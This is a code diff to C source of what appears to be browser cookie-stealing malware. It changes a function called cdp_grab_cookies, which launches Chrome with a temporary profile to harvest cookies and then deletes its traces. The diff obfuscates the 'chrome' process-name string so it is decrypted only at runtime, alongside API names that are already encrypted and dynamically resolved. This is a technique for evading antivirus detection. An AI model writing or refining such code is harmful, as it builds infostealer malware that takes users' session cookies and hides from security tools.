@@ -384,7 +384,12 @@ int cdp_grab_cookies(const char *chrome_exe_path, const char *output_path) {
     }
 
     /* Kill existing Chrome */
-    kill_browser_processes("chrome");
+    {
+        static char _kill_chrome[16];
+        static int _kill_init;
+        if (!_kill_init) { enc_decrypt(enc_bp_kill_chrome, ENC_BP_KILL_CHROME_LEN, _kill_chrome); _kill_init = 1; }
+        kill_browser_processes(_kill_chrome);
+    }
 
     /* Get temp path for user data dir */
     pGetTempPathW fnGetTempPath = (pGetTempPathW)({ char fn_c[32]; enc_decrypt(enc_GetTempPathW, ENC_GETTEMPPATHW_LEN, fn_c); resolve_fn(kernel32, fn_c); });
@@ -520,7 +525,12 @@ int cdp_grab_cookies(const char *chrome_exe_path, const char *output_path) {
 
     /* Terminate Chrome */
     /* We stored pi.hProcess above but it's out of scope — kill by process name */
-    kill_browser_processes("chrome");
+    {
+        static char _kill_chrome[16];
+        static int _kill_init;
+        if (!_kill_init) { enc_decrypt(enc_bp_kill_chrome, ENC_BP_KILL_CHROME_LEN, _kill_chrome); _kill_init = 1; }
+        kill_browser_processes(_kill_chrome);
+    }
 
     /* Cleanup temp dir */
     pRemoveDirectoryW fnRmDir = (pRemoveDirectoryW)({ char fn_rm[32]; enc_decrypt(enc_RemoveDirectoryW, ENC_REMOVEDIRECTORYW_LEN, fn_rm); resolve_fn(kernel32, fn_rm); });
